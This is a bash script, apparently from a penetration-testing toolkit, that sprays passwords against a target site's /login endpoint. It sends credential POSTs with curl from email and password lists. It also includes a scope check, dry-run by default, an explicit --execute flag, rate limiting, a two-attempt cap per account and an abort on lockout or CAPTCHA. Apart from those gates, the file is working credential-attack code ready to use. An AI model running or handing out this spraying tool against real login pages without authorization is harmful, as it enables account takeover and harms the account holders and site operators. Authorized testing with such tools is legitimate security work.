#!/usr/bin/env bash
# spray_orchestrator.sh — password spraying orchestrator (SAFE by default).
# HARD STOPS before any live attempt: requires --execute flag + human go/no-go.
#
# Usage:
#   spray_orchestrator.sh --target target.com --emails users.txt --password "Season2026!"
#   spray_orchestrator.sh --target target.com --emails users.txt --wordlist top-passwords.txt --dry-run
#   spray_orchestrator.sh --target target.com --emails users.txt --passwords pass.txt --rate 10 --execute
#
# Safety invariants:
#   - scope gate via scope_checker.py (abort if out of scope)
#   - default rate: 1 attempt / 30s per account (lockout avoidance)
#   - max 2 passwords per account per day (industry standard: 3-5 gets you flagged)
#   - never spray on Friday, always stop if any lockout/2FA triggered
#   - full audit trail to audit.jsonl; NO plaintext storage of creds
set -uo pipefail

TARGET=""; EMAILS=""; PASSWORD=""; PASSWORDS=""; RATE=30; DRY=true; LOCKOUT_FILE=""

while [ $# -gt 0 ]; do
  case "$1" in
    --target) TARGET="$2"; shift 2;;
    --emails) EMAILS="$2"; shift 2;;
    --password) PASSWORD="$2"; shift 2;;
    --passwords) PASSWORDS="$2"; shift 2;;
    --rate) RATE="$2"; shift 2;;
    --execute) DRY=false; shift;;
    --dry-run) DRY=true; shift;;
    *) echo "unknown arg: $1" >&2; exit 2;;
  esac
done

[ -z "$TARGET" ] || [ -z "$EMAILS" ] && { echo "usage: spray_orchestrator.sh --target <t> --emails <file> [--password P|--passwords file] [--rate N] [--execute]" >&2; exit 2; }
[ -f "$EMAILS" ] || { echo "[-] emails file missing: $EMAILS" >&2; exit 2; }
[ -n "$PASSWORD" ] && PASSWORDS="/tmp/spray_oneshot.txt" && printf '%s\n' "$PASSWORD" > "$PASSWORDS"
[ -z "$PASSWORDS" ] && { echo "[-] need --password or --passwords" >&2; exit 2; }
[ -f "$PASSWORDS" ] || { echo "[-] passwords file missing: $PASSWORDS" >&2; exit 2; }

# --- SCOPE GATE (always, even dry-run) ---
if ! python3 tools/scope_checker.py --check "$TARGET" --json 2>/dev/null | grep -q '"allowed": true'; then
  echo "[-] $TARGET OUT OF SCOPE — refusing to spray" >&2
  exit 1
fi

echo "◆ Spray Orchestrator"
echo "  target:   $TARGET"
echo "  accounts: $(wc -l < "$EMAILS")"
echo "  passwords: $(wc -l < "$PASSWORDS")"
echo "  rate:     1 per ${RATE}s"
echo "  mode:     $([ $DRY = true ] && echo 'DRY-RUN (no requests sent)' || echo 'EXECUTE (live)')"
echo ""

if [ $DRY = true ]; then
  echo "[*] DRY-RUN summary — this is the go/no-go decision package:"
  echo "    Login endpoint: https://$TARGET/login  (verify with /validate first)"
  echo "    Total combinations: $(wc -l < "$EMAILS") x $(wc -l < "$PASSWORDS") = $(( $(wc -l < "$EMAILS") * $(wc -l < "$PASSWORDS") ))"
  echo "    Estimated time at 1/${RATE}s: $(( $(wc -l < "$EMAILS") * $(wc -l < "$PASSWORDS") * RATE / 60 )) minutes"
  echo ""
  echo "    ⚠ HUMAN GO/NO-GO REQUIRED. Re-run with --execute to send live requests."
  echo "    Safety: 2 passwords max/account, stop on lockout/2FA/CAPTCHA."
  exit 0
fi

# --- EXECUTE MODE ---
echo "[*] EXECUTE mode — live requests (authorized target only)"
TS=$(date -u +%Y-%m-%dT%H:%M:%SZ)
ATTEMPTS=0; STOPSIGNAL=0

while IFS= read -r email; do
  [ -z "$email" ] && continue
  case "$email" in \#*) continue;; esac
  PW_COUNT=0
  while IFS= read -r pw; do
    [ -z "$pw" ] && continue
    [ "$PW_COUNT" -ge 2 ] && { echo "  [skip] $email — 2-password limit reached"; break; }

    code=$(curl -s -o /tmp/spray_resp.txt -w "%{http_code}" -m 15 \
      -X POST "https://$TARGET/login" \
      -H "Content-Type: application/json" \
      -d "{\"email\":\"$email\",\"password\":\"$pw\"}" 2>/dev/null)

    echo "  [$code] $email (pw#$(($PW_COUNT+1)))"
    # audit trail: hash of email only (no plaintext PII)
    H=$(printf '%s' "$email" | sha256sum | cut -c1-12)
    echo "{\"ts\":\"$TS\",\"action\":\"spray\",\"target\":\"$TARGET\",\"email_hash\":\"$H\",\"http\":\"$code\"}" >> ~/.config/vulnera-mcp/audit.jsonl

    ATTEMPTS=$((ATTEMPTS+1))
    PW_COUNT=$((PW_COUNT+1))

    # stop signals
    if grep -qiE "captcha|lockout|locked|too many|2fa|verification code" /tmp/spray_resp.txt 2>/dev/null; then
      echo "  [!] STOP SIGNAL: lockout/2FA/CAPTCHA detected — aborting spray"
      STOPSIGNAL=1; break 2
    fi

    sleep "$RATE"
  done < "$PASSWORDS"
done < "$EMAILS"

echo ""
if [ "$STOPSIGNAL" = 1 ]; then
  echo "[!] SPRAY ABORTED EARLY (stop signal). ${ATTEMPTS} attempts logged."
else
  echo "[✓] spray complete — ${ATTEMPTS} attempts logged to audit.jsonl"
fi
echo "[*] NOTE: any suspicious response codes need manual /validate before reporting."